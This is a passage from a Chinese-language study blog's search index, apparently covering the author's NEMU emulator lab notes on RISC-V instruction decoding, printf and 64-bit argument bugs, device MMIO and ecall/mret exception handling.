getopt_long\u3002\u4e4b\u524d\u4e00\u76f4\u4ee5\u4e3a C \u8bed\u8a00\u547d\u4ee4\u884c\u53c2\u6570\u90fd\u662f\u9760\u624b\u52a8\u63d0\u53d6\u89e3\u6790\u7684\uff0c\u539f\u6765\u8fd8\u6709\u4e00\u4e2a\u4e13\u95e8\u7684\u5e93\u51fd\u6570\u7528\u6765\u5e72\u8fd9\u4e2a\uff0c\u5927\u6982\u4f7f\u7528\u65b9\u5f0f\u5c31\u662f\uff1a <pre><code>#include &lt;getopt.h&gt;\nstatic int parse_args(int argc, char *argv[]) {\n    const struct option table[] = {\n        {\"batch\", no_argument      , NULL, 'b'},\n        {\"log\"  , required_argument, NULL, 'l'},\n        {\"help\" , no_argument      , NULL, 'h'},\n        {0      , 0                , NULL,  0 }.\n    };\n    int o;\n    while ((o = getopt_long(argc, argv, \"-bhl:\", table, NULL)) != -1) { // l \u540e\u5192\u53f7\u8868\u793a\u540e\u9762\u9700\u8981\u53c2\u6570\n        switch (o) {\n            case 'b': ...; break;\n            case 'l': log_file = optarg; break; // optarg \u4e3a\u7b49\u53f7\u540e\u7684\u5b57\u7b26\u4e32\n            case 1: ...; break; // \u76f4\u63a5\u4f20\u5165\u7684\u53c2\u6570\uff0c\u4e0d\u662f\u9009\u9879\n            default:\n                // print help message\n                exit(0);\n        }\n    }\n    return 0;\n}\n</code></pre></p> <p>\u5269\u4e0b\u7684 PA1 \u597d\u50cf\u4e5f\u6ca1\u4ec0\u4e48\u597d\u8bb0\u7684\u4e86\u3002\u8868\u8fbe\u5f0f\u6c42\u503c\u548c\u76d1\u89c6\u70b9\u90fd\u8fd8\u7b97\u597d\u5199\u3002</p>"},{"location":"cs/system/pa/#pa2","title":"PA2","text":""},{"location":"cs/system/pa/#pa21","title":"PA2.1","text":"<p>\u8fd9\u90e8\u5206\u662f\u5b8c\u5584 NEMU \u7684\u8bd1\u7801\u3001\u6267\u884c\u8fc7\u7a0b\u3002\u8fd9\u4e2a\u90e8\u5206\u5728 ics2022 \u7248\u7684 PA \u4e2d\u5199\u7684\u5f88\u795e\u5947\uff0c\u8ba9 riscv \u7684\u8bd1\u7801\u5199\u8d77\u6765\u66f4\u6e05\u6670\u7b80\u6d01\u3002\u5177\u4f53\u6765\u8bf4\u90fd\u662f\u901a\u8fc7\u5b8f\u6765\u5b9e\u73b0\u7684\u3002</p> <p>\u5177\u4f53\u6765\u8bb2\u5c31\u662f\u5b9a\u4e49\u4e86\u8fd9\u4e48\u51e0\u4e2a\u5b8f/\u51fd\u6570\uff1a <pre><code>__attribute__((always_inline))\nstatic inline void pattern_decode(const char *str, int len,\n    uint64_t *key, uint64_t *mask, uint64_t *shift) {\n  ... // \u4ece str \u4e2d\u89e3\u6790\u51fa key, mask, shift\n      // \u5bf9\u5e94\u4f4d\u5982\u679c\u662f 1 \u5219 key \u8be5\u4f4d\u4e3a 1\uff0c\u5982\u679c\u662f ? \u5219 mask \u8be5\u4f4d\u4e3a 0\n      // \u6700\u7ec8\u6548\u679c\u4e3a\u5339\u914d\u4e0a\u7684\u6307\u4ee4 (inst &gt;&gt; shift) &amp; mask == key\n}\n#define INSTPAT_START(name) { const void ** __instpat_end = &amp;&amp;concat(__instpat_end_, name); \n#define INSTPAT_END(name) concat(__instpat_end_, name): ; }\n#define INSTPAT_INST(s) ((s)-&gt;isa.instr.val)\n#define INSTPAT_MATCH(s, name, type, ... /* execute body */) { \\\n    decode_operand(s, &amp;dest, &amp;src1, &amp;src2, &amp;imm, concat(TYPE_, type)); \\\n    __VA_ARGS__; \\\n}\n#define INSTPAT(pattern, ...) do { \\\n    uint64_t key, mask, shift; \\\n    pattern_decode(pattern, STRLEN(pattern), &amp;key, &amp;mask, &amp;shift); \\\n    if ((((uint64_t)INSTPAT_INST(s) &gt;&gt; shift) &amp; mask) == key) { \\\n        INSTPAT_MATCH(s, ##__VA_ARGS__); \\\n        goto *(__instpat_end); \\\n    } \\\n} while (0)\n</code></pre></p> <p>\u7136\u540e\u662f\u4e24\u4e2a\u51fd\u6570\uff0c\u4e00\u4e2a\u7528\u6765\u6839\u636e\u7c7b\u578b\u89e3\u7801\u64cd\u4f5c\u6570\uff0c\u4e00\u4e2a\u7528\u6765\u89e3\u7801\u6307\u4ee4\uff08\u5305\u62ec\u8bd1\u7801\u548c\u6267\u884c\uff09\uff1a</p> <pre><code>static void decode_operand(Decode *s, int *dest, word_t *src1, word_t *src2, word_t *imm, int type) {\n    uint32_t i = s-&gt;isa.instr.val;\n    int rd  = BITS(i, 11, 7);\n    int rs1 = BITS(i, 19, 15);\n    int rs2 = BITS(i, 24, 20);\n    *dest = rd;\n    switch (type) {\n        case TYPE_I: src1R();          immI(); break;\n        case TYPE_U:                   immU(); break;\n        case TYPE_S: src1R(); src2R(); immS(); break;\n        case TYPE_R: src1R(); src2R();         break;\n        case TYPE_B: src1R(); src2R(); immB(); break;\n        case TYPE_J:                   immJ(); break;\n    }\n}\n\nstatic int decode_exec(Decode *s) {\n    int dest = 0;\n    word_t src1 = 0, src2 = 0, imm = 0;\n    s-&gt;dnpc = s-&gt;snpc;\n    INSTPAT_START();\n    INSTPAT(\"0000000 ????? ????? 000 ????? 01100 11\", add, R, Reg(dest) = src1 + src2);\n    ...\n    INSTPAT_END();\n    Reg(0) = 0;\n    return 0;\n}\n</code></pre> <ul> <li>INSTPAT_START \u548c INSTPAT_END \u4e24\u4e2a\u5b8f\u6784\u6210\u4e86\u4e00\u7ec4\u5927\u62ec\u53f7\uff0c\u5728\u672b\u5c3e\u521b\u5efa\u4e86\u4e00\u4e2a\u6807\u53f7\uff0c\u5e76\u5728\u5f00\u5934\u83b7\u53d6\u4e86\u5176\u5730\u5740</li> <li>INSTPAT \u5b8f\u5c55\u5f00\u540e\u9996\u5148\u901a\u8fc7 pattern_decode \u83b7\u53d6 key mask shift\uff0c\u7136\u540e\u901a\u8fc7 INSTPAT_INST \u83b7\u53d6\u6307\u4ee4\u503c\u5e76\u68c0\u6d4b\u662f\u5426\u5339\u914d</li> <li>\u5982\u679c\u5339\u914d\u5219\u8fdb\u5165 INSTPAT_MATCH \u5b8f\u4e2d\uff0c\u7136\u540e goto \u5230\u7ed3\u5c3e\u6807\u53f7\u7ed3\u675f\u5f53\u524d\u6307\u4ee4<ul> <li>INSTPAT_MATCH \u5b8f\u4e2d\u9996\u5148\u8c03\u7528 decode_operand \u51fd\u6570\uff0c\u6839\u636e\u4f20\u5165\u7684\u6307\u4ee4\u7c7b\u578b\u63d0\u53d6\u5bf9\u5e94\u7684\u64cd\u4f5c\u6570\u5230 decode_exec \u7684\u5c40\u90e8\u53d8\u91cf\u4e2d</li> <li>\u7136\u540e __VA_ARGS__ \u5c06\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u5c55\u5f00\u5e76\u6267\u884c\uff0c\u4e5f\u5c31\u662f\u6307\u4ee4\u7684\u6267\u884c\u90e8\u5206</li> <li>\u901a\u8fc7 Reg \u5b8f\u5373\u53ef\u8bbf\u95ee\u8bfb\u5199\u5bc4\u5b58\u5668</li> </ul> </li> </ul> <p>\u6574\u4f53\u770b\u6765\u8fd9\u4e2a\u8bbe\u8ba1\u662f\u975e\u5e38\u5de7\u5999\u7684\uff0c\u867d\u7136\u5b8f\u770b\u8d77\u6765\u6bd4\u8f83\u590d\u6742\u96be\u61c2\uff0c\u4f46\u6700\u7ec8\u5b9e\u9645\u4e0a\u8981\u52a0\u7684\u5c31\u662f\u9488\u5bf9\u6bcf\u4e00\u79cd\u6307\u4ee4\u589e\u52a0 INSTPAT \u4e00\u884c\u7684\u5185\u5bb9\uff0c\u800c\u4e14\u6307\u4ee4\u540d\u3001\u7c7b\u578b\u3001\u4f5c\u7528\u90fd\u6e05\u6670\u7684\u4f53\u73b0\u5728\u4e00\u884c\u8bed\u53e5\u4e2d\u4e86\u3002\u7f3a\u70b9\u5927\u6982\u662f\u4e00\u6761\u6307\u4ee4\u6709\u591a\u79cd\u6548\u679c\u7684\u65f6\u5019\uff08\u4f8b\u5982 ecall mret csr \u6307\u4ee4\u7b49\uff09\u6324\u5728\u4e00\u8d77\u770b\u8d77\u6765\u4e0d\u592a\u4f18\u7f8e\uff08</p> <p>\u6709\u4e86\u4e4b\u524d\u7cfb\u7edf\u5b9e\u9a8c\u65f6\u8bfb RISC-V \u7684\u57fa\u7840\uff0c\u5bf9\u7740 RISC-V \u975e\u7279\u6743\u7ea7 ISA \u9875\u9762\u4e00\u6761\u6761\u6307\u4ee4\u6284\u5728\u91cc\u9762\u5c31\u53ef\u4ee5\u4e86\u3002\u5b9e\u9645\u8fd0\u884c\u8d77\u6765\u624d\u53d1\u73b0\u8fd8\u6709 RV32M \u7684\u6269\u5c55\uff0c\u51e0\u4e2a\u6307\u4ee4\u4e5f\u9700\u8981\u5b9e\u73b0\u4e00\u4e0b\uff0c\u540e\u7eed\u518d\u8865\u5145\u5230\u90a3\u4e2a\u9875\u9762\u3002</p> <p>\u8fd9\u90e8\u5206\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u5c31\u662f\u5173\u4e8e\u51e0\u4e2a M \u6269\u5c55\u6307\u4ee4\u7684\u64cd\u4f5c\u6570\u7c7b\u578b\u5f3a\u8f6c\u3001\u6ea2\u51fa\u3001\u9664\u96f6\u5904\u7406\u7b49\u4e86\u3002</p>"},{"location":"cs/system/pa/#pa22","title":"PA2.2","text":"<p>PA2.2 \u524d\u534a\u90e8\u5206\u5728\u5b9e\u73b0\u4e00\u4e9b\u5e93\u51fd\u6570\u5185\u5bb9\uff0c\u5305\u62ec string.h \u7684\u4e00\u4e9b\u51fd\u6570\uff08\u5b9e\u73b0 memcpy \u7684\u65f6\u5019\u51fa\u73b0\u4e86\u4e00\u4e2a\u6f5c\u5728 bug\uff0c\u540e\u9762 PA3.3 \u518d\u8bf4\uff09\uff0c\u4ee5\u53ca stdio.h \u7684 sprintf \u51fd\u6570\uff0c\u540e\u9762 PA2.3 \u7ed3\u5408\u4e32\u53e3\u8bbe\u5907\u5b9e\u73b0 printf \u51fd\u6570\uff0c\u8fd9\u91cc\u662f PA \u4ee5\u6765\u7b2c\u4e00\u6b21\u75db\u82e6\u8c03\u8bd5\uff0c\u653e\u5728\u540e\u9762\u5199\u3002</p> <p>\u9664\u4e86\u8fd9\u4e9b\uff0c\u540e\u534a\u90e8\u5206\u5b9e\u73b0\u5404\u79cd trace \u4e5f\u6ca1\u4ec0\u4e48\u96be\u5ea6\uff0c\u8fd9\u91cc\u6211\u628a\u5b83\u4eec\u90fd\u7406\u89e3\u4e3a\u4e86\u901a\u8fc7 sdb \u547d\u4ee4\u8f93\u51fa trace\uff0c\u5b9e\u9645\u4e0a\u76f4\u63a5 Log \u5c31\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u65b9\u5f0f\uff0c\u4e0d\u9700\u8981\u641e\u90a3\u4e48\u590d\u6742\u3002\u7136\u540e\u5c31\u662f difftest\u3002</p> <p>\u539f\u5148\u542c\u5230 difftest \u6211\u8fd8\u4ee5\u4e3a\u662f\u4ec0\u4e48\u9ad8\u6df1\u7684\u6280\u672f\uff0c\u4ed4\u7ec6\u4e00\u770b\u539f\u6765\u5c31\u662f\u201c\u5bf9\u62cd\u201d\uff0c\u7528\u81ea\u5df1\u5b9e\u73b0\u7684 NEMU \u548c\u66f4\u51c6\u786e\u7684 Spike \u5728\u6bcf\u6761\u6307\u4ee4\u8fd0\u884c\u540e\u5bf9\u5bc4\u5b58\u5668\u7684\u503c\u8fdb\u884c\u5bf9\u6bd4\uff0c\u786e\u4fdd\u6307\u4ee4\u7684\u6267\u884c\u6ca1\u6709\u9519\u8bef\u3002\u770b\u4e00\u770b\u6e90\u7801\u5176\u5b9e\u4e5f\u662f\u5f88\u6e05\u6670\u7684\u3002\u5728\u8c03\u8bd5\u7684\u65f6\u5019\u4e5f\u4e00\u76f4\u5f00\u7740 difftest\uff0c\u6ca1\u51fa\u73b0\u8fc7\u4ec0\u4e48\u95ee\u9898\uff0c\u76f4\u5230\u540e\u9762\u52a0\u4e0a\u5f02\u5e38\u5904\u7406\u4e4b\u540e\u5e2e\u6211\u6355\u6349\u5230\u4e86\u51e0\u4e2a\u989d\u5916\u7684\u5f02\u5e38\uff0c\u540e\u9762\u518d\u8bf4\u3002</p>"},{"location":"cs/system/pa/#pa23","title":"PA2.3","text":"<p>RISC-V \u901a\u8fc7 MMIO \u6765\u5b9e\u73b0\u8bbe\u5907\u901a\u4fe1\u3002\u539f\u7406\u5927\u6982\u5c31\u662f NEMU \u4e2d\u5404\u4e2a\u8bbe\u5907\u5206\u522b\u521b\u5efa\u4e00\u4e9b\u7a7a\u95f4\uff0c\u7136\u540e\u5c06\u8fd9\u4e9b\u7a7a\u95f4\u6620\u5c04\u5230\u6307\u5b9a\u7684\u5730\u5740\u4e0a\uff0c\u5e76\u4e14\u6ce8\u518c\u4e00\u4e2a callback \u51fd\u6570\u3002\u5728\u8bbf\u5b58\u7684\u65f6\u5019\u5982\u679c\u5730\u5740\u4e0d\u843d\u5728\u7269\u7406\u5730\u5740\u8303\u56f4\u5185\uff0c\u5219\u5c1d\u8bd5\u641c\u7d22\u5730\u5740\u662f\u5426\u5728\u67d0\u4e00\u4e2a\u8bbe\u5907\u6620\u5c04\u7684\u7a7a\u95f4\u4e2d\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5bf9\u4e8e\u8bfb\u53d6\u5148\u8c03\u7528 callback\uff0c\u8fd9\u65f6\u53ef\u4ee5\u5728\u5b9e\u9645\u8bfb\u53d6\u6570\u636e\u4e4b\u524d\u66f4\u65b0\u503c\uff0c\u5bf9\u4e8e\u5199\u5165\u5219\u5199\u5165\u540e\u8c03\u7528 callback \u51fd\u6570\u5904\u7406\u65b0\u7684\u503c\u3002</p>"},{"location":"cs/system/pa/#_2","title":"\u4e32\u53e3","text":"<p>\u5bf9\u4e8e\u4e32\u53e3\uff0c\u76f8\u5e94\u4ee3\u7801\u5df2\u7ecf\u63d0\u4f9b\u597d\u4e86\uff0ccallback \u51fd\u6570\u4f1a\u8981\u6c42\u4e00\u5b9a\u662f\u5199\u5165\uff0c\u4e14\u5199\u5165\u7684\u957f\u5ea6\u4e00\u5b9a\u662f\u4e00\u4e2a\u5b57\u8282\u3002\u63a5\u6536\u5230\u4e00\u4e2a\u5b57\u8282\u540e\u5219\u901a\u8fc7 putch \u6765\u8f93\u51fa\u3002\u5728 AM \u4e2d\uff0cTRM \u90e8\u5206\u5c31\u63d0\u4f9b\u4e86 putch \u51fd\u6570\uff0c\u51fd\u6570\u4f53\u5c31\u53ea\u6709 <code>outb(SERIAL_PORT, ch);</code> \u6765\u5411\u4e32\u53e3\u5730\u5740\u5199\u5165\u5b57\u8282\u8fdb\u884c\u8f93\u51fa\u3002</p> <p>\u6839\u636e\u8fd9\u4e2a\u529f\u80fd\u5c31\u53ef\u4ee5\u5b9e\u73b0 printf \u4e86\u3002\u7531\u4e8e printf\u3001sprintf \u5de5\u4f5c\u539f\u7406\u90fd\u7c7b\u4f3c\uff0c\u533a\u522b\u5728\u4e8e\u8f93\u51fa\u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u53ef\u4ee5\u5c06\u5171\u7528\u7684\u90e8\u5206\u63d0\u53d6\u51fa\u5355\u4e2a\u51fd\u6570 vprintf\uff0c\u5e76\u4e14\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u7528\u6765\u8f93\u51fa\u5355\u4e2a\u5b57\u7b26\u3002\u7531\u4e8e printf \u53c2\u6570\u4e0d\u56fa\u5b9a\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u4f7f\u7528 va_ \u76f8\u5173\u7684\u529f\u80fd\u4e86\u3002printf \u548c sprintf \u672c\u8eab\u5c31\u662f\u63a5\u6536\u4e00\u4e0b\u53c2\u6570\u7136\u540e\u4f20\u7ed9 vprintf\uff08\u5728\u7cfb\u7edf\u5b9e\u9a8c\u91cc\u5b66\u6765\u7684\uff09\uff0c\u6240\u4ee5\u5b83\u4eec\u4e24\u4e2a\u5199\u8d77\u6765\u5c31\u662f\uff1a <pre><code>int printf(const char *fmt, ...) {\n    int res = 0;\n    va_list ap;\n    va_start(ap, fmt);\n    res = vprintf(putch, fmt, ap);\n    va_end(ap);\n    return res;\n}\n\nstatic char *__out;\nvoid sputch(char ch) { *__out++ = ch; }\n\nint sprintf(char *out, const char *fmt, ...) {\n    int res = 0;\n    va_list ap;\n    va_start(ap, fmt);\n    __out = out;\n    res = vprintf(sputch, fmt, ap);\n    *__out = '\\0';\n    va_end(ap);\n    return res;\n}\n</code></pre></p> <p>\u4e3b\u8981\u7684\u5904\u7406\u90fd\u5728 vprintf \u4e2d\u3002\u5f53\u65f6\u6211\u5c31\u76f4\u63a5\u6284\u7cfb\u7edf\u4e8c\u7ed9\u7684 printf \u4ee3\u7801\u4e86\uff0c\u6ca1\u60f3\u5230\u88ab\u5751\u7684\u8d85\u60e8\uff0c\u5168\u662f bug\u3002\u4e0d\u8fc7\u4e3b\u4f53\u6ca1\u4ec0\u4e48\u95ee\u9898\uff1a <pre><code>int vprintf(void (*putch)(char), const char *fmt, va_list ap) {\n    int in_format = 0, longarg = 0; size_t pos = 0;\n    for ( ; *fmt; ++fmt) {\n        if (in_format) {\n            switch (*fmt) {\n                case 'x': ...\n                ...\n            }\n        } else if (*fmt == '%') {\n            in_format = 1;\n        } else {\n            putch(*fmt); pos++;\n        }\n    }\n    return pos;\n}\n</code></pre> \u5f53\u65f6\u5199\u5b8c\u4e4b\u540e\u8dd1\u8d77\u6765\u6ca1\u5565\u95ee\u9898\uff0c\u4f46\u662f\u540e\u6765\u5199\u65f6\u949f\u7684\u65f6\u5019\u53d1\u73b0\u4e86\u4e24\u4e2a\u95ee\u9898\uff1a</p> <ol> <li>\u5bf9\u4e8e 64 \u4f4d\u6570\uff0c\u8f93\u51fa\u7684\u7ed3\u679c\u5e76\u4e0d\u6b63\u786e\uff0c\u5f88\u4e71\uff0c\u5dee\u522b\u5f88\u5927</li> <li>\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6570\uff0c\u8f93\u51fa\u4e71\u4e03\u516b\u7cdf\uff0c\u751a\u81f3\u4f1a\u8f93\u51fa .)/( \u8fd9\u79cd\u4e00\u5806\u4e71\u7cdf\u7684\u5b57\u7b26</li> </ol> <p>\u91cd\u65b0\u5ba1\u89c6\u4e86\u4e00\u904d\u7cfb\u7edf\u4e8c\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5373\u4f7f\u662f\u65e0\u7b26\u53f7\u8f93\u51fa\uff0c\u867d\u7136 va_arg \u83b7\u53d6\u53c2\u6570\u7684\u65f6\u5019\u90fd\u5199\u4e86 unsigned\uff0c\u4f46\u6700\u540e\u5faa\u73af\u8ba1\u7b97\u8f93\u51fa\u4f4d\u7684\u65f6\u5019\u4e2d\u95f4\u53d8\u91cf\u4ecd\u7136\u90fd\u662f signed \u7684\uff0c\u6539\u8fc7\u6765\u540e\u8f93\u51fa\u4e0d\u4e71\u5957\u4e86\uff0c\u4f46\u662f 64 \u4f4d\u8f93\u51fa\u4ecd\u7136\u6709\u95ee\u9898\u3002</p> <p>\u6211\u751a\u81f3\u8fd8\u770b\u4e86\u6c47\u7f16\u4ee3\u7801\uff0c\u53d1\u73b0\u4e86\u4e00\u4e9b\u8be1\u5f02\u7684\u4e8b\u60c5\uff0c\u5c31\u662f\u6b63\u5e38\u6765\u8bb2\u51fd\u6570\u7684\u53c2\u6570\u4f1a\u4f9d\u6b21\u653e\u5165 a0 a1 a2 ... \u5bc4\u5b58\u5668\u4e2d\uff0c\u4f46\u662f\u5bf9\u4e8e 64 \u4f4d\u6570\u636e\uff0c\u4f1a\u8df3\u8fc7 a1 \u653e\u5165 a2 \u548c a3 \u4e2d\uff0c\u4f8b\u5982\uff1a</p> <pre><code>printf(\"%d %d\", 123, 456);\n    a0 -&gt; address of \"%d %d\"\n    a1 -&gt; 123\n    a2 -&gt; 456\n\nprintf(\"%lld\", 0x1234567890);\n    a0 -&gt; address of \"%lld\"\n    a2 -&gt; 0x34567890\n    a3 -&gt; 0x12\n</code></pre> <p>\u6211\u4e00\u5ea6\u4ee5\u4e3a\u8fd9\u662f\u7f16\u8bd1\u5668\u9519\u4e86\uff0c\u4f46\u5373\u4f7f\u662f riscv \u7684 gcc \u53c8\u600e\u4e48\u4f1a\u51fa\u8fd9\u79cd\u9519\u8bef\u5462\u3002\u5728\u7ea0\u7ed3\u751a\u81f3\u6253\u7b97\u653e\u5f03\u7684\u65f6\u5019\u6211\u53c8\u5230 Compiler Explorer \u4e0a\u8bd5\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u786e\u5b9e\u5c31\u662f\u8fd9\u6837\u7f16\u8bd1\u7684\uff0c\u5f88\u795e\u5947\u3002\u6240\u4ee5\u95ee\u9898\u80af\u5b9a\u8fd8\u662f\u51fa\u73b0\u5728 vprintf \u5185\u90e8\u4e86\u3002</p> <p>\u4e07\u6076\u4e4b\u6e90\u662f vsc \u5c06 uint64_t \u63d0\u793a\u6210\u4e86\u7531 unsigned long typedef \u800c\u6765\u7684\uff0c\u6240\u4ee5\u6211\u5c31\u7406\u6240\u5e94\u5f53\u7684\u8ba4\u4e3a\u7528 va_arg \u83b7\u53d6\u4e00\u4e2a 64 \u4f4d\u6570\u7684\u65f6\u5019\u4f7f\u7528 va_arg(ap, long) \u662f\u6b63\u786e\u7684\uff0c\u7cfb\u7edf\u4e8c\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002\u800c\u95ee\u9898\u5c31\u5728\u4e8e vsc \u63d0\u793a\u7684\u6765\u6e90\u662f x86 \u7684 gcc \u5185\u90e8\u7684\uff0c\u800c\u4e0d\u662f riscv \u7684\u3002printf \u8f93\u51fa\u4e00\u4e0b long \u7684\u5927\u5c0f\u7684\u8bdd\u53ef\u4ee5\u53d1\u73b0\u4e5f\u662f\u56db\u4e2a\u5b57\u8282\u2026\u2026\u6240\u4ee5\u5728\u7528\u5230 64 \u4f4d\u6570\u7684\u65f6\u5019\u660e\u786e\u7684\u5199\u51fa int64_t \u6216 uint64_t \u5c31\u597d\u4e86\u3002</p>"},{"location":"cs/system/pa/#_3","title":"\u65f6\u949f","text":"<p>\u65f6\u949f\u5176\u5b9e\u5199\u8d77\u6765\u95ee\u9898\u4e0d\u5927\u7684\uff0c\u4e0d\u8fc7\u505a\u65f6\u949f\u7684\u65f6\u5019\u6b63\u662f\u9700\u8981 printf 64 \u4f4d\u65e0\u7b26\u53f7\u6570\u7684\u65f6\u5019\uff0c\u8fd9\u65f6\u53d1\u73b0\u4e86\u4e0a\u9762\u8bf4\u5230\u7684 printf \u7684 bug\uff0c\u8c03\u8d77\u6765\u5c31\u76f8\u5f53\u75db\u82e6\u4e86\u3002</p> <p>\u901a\u8fc7\u9605\u8bfb\u6e90\u7801\u53d1\u73b0\uff0cNEMU \u91cc timer \u7684 callback \u51fd\u6570\u53ea\u6709\u5728 offset == 4 \u4e5f\u5c31\u662f\u8bfb\u53d6\u9ad8 32 \u4f4d\u7684\u65f6\u5019\u4f1a\u5237\u65b0\u65f6\u95f4\uff0c\u6240\u4ee5\u4e0d\u66f4\u6539\u8fd9\u91cc\u7684\u8bdd\u5c31\u9700\u8981\u5148\u8bfb\u53d6\u9ad8 32 \u4f4d\u518d\u8bfb\u53d6\u4f4e 32 \u4f4d\uff0c\u7136\u540e\u5408\u5e76\u5f97\u5230 64 \u4f4d\u65f6\u95f4\u6233\u3002</p> <p>\u5927\u6982 PA2 \u9700\u8981\u6ce8\u610f\u7684\u5c31\u8fd9\u4e9b\u4e86\uff0c\u540e\u9762\u952e\u76d8\u3001VGA \u90fd\u8fd8\u597d\u5b9e\u73b0\uff0c\u4e5f\u6ca1\u51fa\u5565\u95ee\u9898\u3002</p>"},{"location":"cs/system/pa/#pa3","title":"PA3","text":""},{"location":"cs/system/pa/#pa31","title":"PA3.1","text":"<p>PA3.1 \u9700\u8981\u5b8c\u6210\u5f02\u5e38\u5904\u7406\uff0c\u5b9e\u73b0\u7279\u6743\u6307\u4ee4\u548c\u4e00\u5806 csr \u6307\u4ee4\u3002\u4ee5\u53ca\u540e\u9762\u5f02\u5e38\u4e8b\u4ef6\u7684\u5206\u53d1\uff0c\u4e0a\u4e0b\u6587\u7684\u4fdd\u5b58\u548c\u6062\u590d\uff0c\u8fd9\u5012\u662f\u90fd\u86ee\u7b80\u5355\uff0c\u6ca1\u5565\u53ef\u8bb0\u7684\u3002</p> <p>CSR \u6307\u4ee4\u90fd\u8fd8\u597d\u529e\uff0c\u867d\u7136 verilog \u7f16\u5199\u786c\u4ef6\u7684\u65f6\u5019\u75db\u82e6\u9762\u5177\uff0c\u4f46\u662f\u8fd9\u91cc\u5c31\u5f88\u6e05\u6670\u4e86\uff0c\u76f4\u63a5\u5199\u4e00\u4e2a\u8bfb\u4e00\u4e2a\u5199\u5c31\u597d\uff0c\u800c\u4e14\u53ef\u4ee5\u5c06\u6240\u6709 csr \u6307\u4ee4\u90fd\u5f53\u4f5c I \u578b\uff0c\u8fd9\u6837\u89e3\u6790\u51fa\u7684\u7acb\u5373\u6570\u5c31\u662f csr \u5bc4\u5b58\u5668\u7f16\u53f7\u4e86\u3002</p> <p>ecall \u548c mret \u7684\u8bdd\u5c31\u6709\u4e00\u70b9\u5934\u75bc\u4e86\uff0c\u867d\u7136\u8868\u9762\u4e0a\u505a\u7684\u5c31\u662f\u8df3\u8f6c\u5230 mtvec \u6216\u8005 mepc \u4f4d\u7f6e\uff0c\u4f46\u662f\u4e3a\u4e86\u4f7f difftest \u901a\u8fc7\u8fd8\u9700\u8981\u6309\u7167\u8981\u6c42\u4fee\u6539 mstatus \u7684\u503c\u3002\u5728 RISC-V \u7279\u6743\u7ea7 ISA \u7684\u6700\u540e\u6211\u68b3\u7406\u4e86\u5f02\u5e38\u5904\u7406\u7684\u6d41\u7a0b\uff0c\u5305\u62ec\u4e86 ecall \u548c mret \u671f\u95f4\u7684\u5168\u90e8\u6548\u679c\uff1a</p> <p>ecall \u548c mret \u6548\u679c</p> <p>ecall \u65f6\uff1a</p> <ul> <li>\u5c06\u53d1\u751f\u5f02\u5e38\u7684\u6307\u4ee4\u5730\u5740\u4fdd\u5b58\u5230 mepc \u5bc4\u5b58\u5668</li> <li>\u5c06\u4e2d\u65ad\u7c7b\u578b\u7801\u4fdd\u5b58\u5230 mcause \u5bc4\u5b58\u5668\uff0811 \u8868\u793a\u4ece M \u6a21\u5f0f\u53d1\u51fa\u7684 ecall\uff09</li> <li>\u5982\u679c\u4e2d\u65ad\u5e26\u6709\u9644\u52a0\u4fe1\u606f\uff0c\u5c06\u5176\u4fdd\u5b58\u5230 mtval \u5bc4\u5b58\u5668\uff08\u8fd9\u91cc\u5ffd\u7565\uff09</li> <li>\u5982\u679c\u662f\u5916\u90e8\u5f15\u53d1\u7684\u4e2d\u65ad\uff0c\u4ee4 mstatus[MPIE] = mstatus[MIE]\uff08\u4fdd\u5b58\uff09\uff0c\u7136\u540e\u4ee4 mstatus[MIE] = 0\uff08\u5173\u95ed\u4e2d\u65ad\uff09</li> <li>\u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4fdd\u5b58\u5230 mstatus[MPP] \u4e2d</li> <li>\u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a Machine \u6a21\u5f0f</li> <li>\u6839\u636e mtvec \u5bc4\u5b58\u5668\u7684\u8bbe\u7f6e\uff0c\u8df3\u8f6c\u5230\u5bf9\u5e94\u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f</li> </ul> <p>mret \u65f6\uff1a</p> <ul> <li>\u4ee4 mstatus[MIE] = mstatus[MPIE]\uff08\u6062\u590d\uff09\uff0c\u7136\u540e\u4ee4 mstatus[MPIE] = 1</li> <li>\u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a mstatus[MPP] \u4e2d\u4fdd\u5b58\u7684\u503c</li> <li>\u5c06 mstatus[MPP] \u8bbe\u7f6e\u4e3a U \u6a21\u5f0f</li> <li>\u5c06 pc \u503c\u8bbe\u7f6e\u4e3a mepc \u503c\uff0c\u5373\u8df3\u8f6c\u56de\u4e2d\u65ad\u524d\u7684\u7a0b\u5e8f</li> </ul> <p>\u7531\u4e8e mstatus \u5bc4\u5b58\u5668\u6bcf\u4e00\u4f4d\u6709\u81ea\u5df1\u7684\u4f5c\u7528\uff0c\u6240\u4ee5\u4f7f\u7528 union \u662f\u4e00\u4e2a\u65b9\u4fbf\u7684\u9009\u62e9\uff08\u5176\u5b9e\u5230 PA4 \u6211\u624d\u8f6c\u5230 union\uff0c\u4e4b\u524d\u90fd\u662f\u4f4d\u64cd\u4f5c\uff09\uff1a <pre><code>union {\n    struct {\n        uint32_t UIE: 1, SIE: 1, WPRI_0: 1, MIE: 1;\n        uint32_t UPIE: 1, SPIE: 1, WPRI: 1, MPIE: 1;\n        uint32_t SPP: 1, WPRI_1_2: 2, MPP: 2, FS: 2;\n        uint32_t XS: 2, MPRV: 1, SUM: 1, MXR: 1;\n        uint32_t TVM: 1, TW: 1, TSR: 1, WPRI_3_10: 8, SD: 1;\n    } part;\n    word_t val;\n} mstatus;\n</code></pre></p> <p>\u6240\u4ee5\u5728 ecall \u65f6\u505a\u7684\u64cd\u4f5c\u5c31\u662f\uff1a <pre><code>if (cpu.priv == 3) s-&gt;dnpc = isa_raise_intr(11, s-&gt;pc);\nelse if (cpu.priv == 0) s-&gt;dnpc = isa_raise_intr(8, s-&gt;pc);\nelse assert(0);\n// \u5176\u4e2d\nword_t isa_raise_intr(word_t NO, vaddr_t epc) {\n    